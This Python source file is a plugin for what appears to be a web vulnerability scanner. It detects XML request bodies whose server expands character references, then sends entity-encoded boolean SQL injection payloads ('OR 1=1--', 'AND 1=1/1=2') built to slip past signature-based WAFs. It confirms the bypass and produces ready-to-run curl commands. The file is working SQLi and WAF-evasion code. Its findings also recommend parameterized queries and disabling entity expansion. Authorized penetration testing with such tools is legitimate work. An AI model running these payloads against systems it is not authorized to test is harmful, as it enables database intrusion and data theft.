"""Built-in ``xml_inject`` scan plugin.

Detects endpoints that parse XML request bodies and expand character
references, then tests entity-encoded SQLi payloads that a raw-byte WAF never
sees (``&#x55;&#x4e;...`` decodes to ``UNION...`` server-side).
"""

from __future__ import annotations

from .. import xmlinject
from ..models import (
    BodyType,
    Request,
    Response,
    SessionState,
    SqliFinding,
    SqliScanResult,
)
from ..state_fields import is_state_field
from . import ScanPlugin, register_plugin

# Payload pairs: (or_probe, true_control, false_control) for the differential
# that proves the decoded value is concatenated into SQL.


def _payloads(orig_val: str) -> tuple[str, str, str] | None:
    if orig_val.isdigit():
        return (
            f"{orig_val} OR 1=1",
            f"{orig_val} AND 1=1",
            f"{orig_val} AND 1=2",
        )
    return (
        f"{orig_val}' OR 1=1--",
        f"{orig_val}' AND '1'='1",
        f"{orig_val}' AND '1'='2",
    )


@register_plugin
class XmlInjectionPlugin(ScanPlugin):
    name = "xml_inject"
    description = (
        "XML-body detection + entity-encoded SQLi (WAF bypass via &#x..; refs)"
    )

    def collect_params(
        self,
        request,
        include_state_fields: bool = False,
        param_filter: str | None = None,
    ) -> list[tuple[str, str, str]]:
        if request.body_type != BodyType.RAW or not xmlinject.looks_like_xml(request):
            return []
        out = []
        for xp in xmlinject.parse_xml_params(request.body_raw):
            if (param_filter is None or xp.name == param_filter) and (
                include_state_fields or not is_state_field(xp.name)
            ):
                out.append(("xml", xp.name, xp.value))
        return out

    def after_param(
        self,
        request,
        session,
        param_type: str,
        param_name: str,
        orig_val: str,
        baseline,
        result,
    ) -> None:
        if param_type != "xml":
            return
        probe = xmlinject.probe_xml_parsing(
            request, session, param_name, orig_val, baseline=baseline
        )
        if not (probe and probe.decodes_entities):
            return

        result.vulnerabilities.append(
            SqliFinding(
                param=param_name,
                param_type="xml",
                injection_type="xml_entity_decoding",
                confidence="high" if probe.requires_xml else "medium",
                payload=xmlinject.xml_entity_encode(orig_val),
                baseline_status=baseline.status_code,
                payload_status=baseline.status_code,
                evidence=self._probe_evidence(probe),
                suggestion=(
                    f"Endpoint parses XML and expands character references before SQL "
                    f"execution ('{param_name}'). A WAF that scans raw bytes can be "
                    "bypassed with entity-encoded payloads — validate XML strictly and "
                    "use parameterized queries."
                ),
                curl=self._probe_curl(request, param_name, orig_val),
            )
        )
        self._test_encoded(request, session, param_name, orig_val, baseline, result)

    # ------------------------------------------------------------------ probes
    def _probe_evidence(self, probe) -> str:
        bits = []
        for pr in probe.probes:
            status = pr.get("status")
            bits.append(f"{pr['label']}->{status if status is not None else 'n/a'}")
        detail = "; ".join(pr.get("detail", "") for pr in probe.probes)
        return (
            "Behavioral XML probes on the endpoint: "
            + ", ".join(bits)
            + ". "
            + detail
            + " — the numeric character reference was decoded server-side, which "
            "only an XML parser does."
        )

    def _probe_curl(self, request: Request, param: str, value: str) -> str:
        body = xmlinject.replace_element_text(
            request.body_raw, param, value, xmlinject.xml_entity_encode(value)
        )
        return (
            f"curl -i -X POST '{request.url}' -H 'Content-Type: application/xml' "
            f"--data-binary '{body}'"
        )

    # ------------------------------------------------ entity-encoded SQLi test
    def _test_encoded(
        self,
        request: Request,
        session: SessionState,
        p_name: str,
        orig_val: str,
        baseline: Response,
        result: SqliScanResult,
    ) -> None:
        payloads = _payloads(orig_val)
        if not payloads:
            return
        or_payload, true_payload, false_payload = payloads

        def encoded_req(payload: str) -> Request:
            req = request.model_copy(deep=True)
            req.body_raw = xmlinject.replace_element_text(
                request.body_raw,
                p_name,
                orig_val,
                xmlinject.xml_entity_encode(payload),
            )
            return req

        enc_or = xmlinject.send(encoded_req(or_payload), session)
        enc_true = xmlinject.send(encoded_req(true_payload), session)
        enc_false = xmlinject.send(encoded_req(false_payload), session)
        raw_or_req = request.model_copy(deep=True)
        raw_or_req.body_raw = xmlinject.replace_element_text(
            request.body_raw, p_name, orig_val, or_payload
        )
        raw_or = xmlinject.send(raw_or_req, session)
        if not (enc_or and enc_true and enc_false):
            return

        base_status = baseline.status_code
        base_len = baseline.body_len
        base_body = baseline.body or ""
        expanded = (
            enc_or.status_code == base_status
            and enc_or.body_len > base_len + max(30, int(base_len * 0.10))
        )
        true_matches = (
            enc_true.status_code == base_status
            and self._similarity(base_body, enc_true.body or "") >= 0.85
        )
        false_differs = (
            enc_false.status_code != base_status
            or enc_false.body_len < base_len - max(30, int(base_len * 0.10))
        )
        if not (expanded and true_matches and false_differs):
            return

        raw_blocked = raw_or is not None and raw_or.status_code == 403
        enc_body = xmlinject.replace_element_text(
            request.body_raw, p_name, orig_val, xmlinject.xml_entity_encode(or_payload)
        )
        curl = (
            f"curl -i -X POST '{request.url}' -H 'Content-Type: application/xml' "
            f"--data-binary '{enc_body}'"
        )
        result.vulnerabilities.append(
            SqliFinding(
                param=p_name,
                param_type="xml",
                injection_type="xml_encoded_sqli",
                confidence="confirmed" if raw_blocked else "high",
                payload=xmlinject.xml_entity_encode(or_payload),
                baseline_status=base_status,
                payload_status=enc_or.status_code,
                evidence=(
                    f"Entity-encoded '{xmlinject.xml_entity_encode(or_payload)}' was decoded by "
                    f"the XML parser and executed: OR 1=1 expanded the result set (len {base_len} "
                    f"-> {enc_or.body_len}), 'AND 1=1' matched baseline, 'AND 1=2' differed "
                    f"(status {enc_false.status_code}, len {enc_false.body_len}). "
                    + (
                        f"Raw payload was blocked ({raw_or.status_code}) — the WAF only sees "
                        "'&#x..;' tokens while SQL receives real SQL. WAF bypass confirmed."
                        if raw_blocked
                        else "Raw channel is also reachable; encoding is a reliable bypass for "
                        "signature-based filters."
                    )
                ),
                suggestion=(
                    f"XML element '{p_name}' is concatenated into SQL and the server expands "
                    "character references after WAF inspection. Disable entity/DTD expansion, "
                    "validate XML strictly, and use parameterized queries."
                ),
                curl=curl,
            )
        )

    @staticmethod
    def _similarity(a: str, b: str) -> float:
        from difflib import SequenceMatcher

        if a == b:
            return 1.0
        if not a or not b:
            return 0.0
        return SequenceMatcher(None, a[:2000], b[:2000]).ratio()


__all__ = ["XmlInjectionPlugin"]
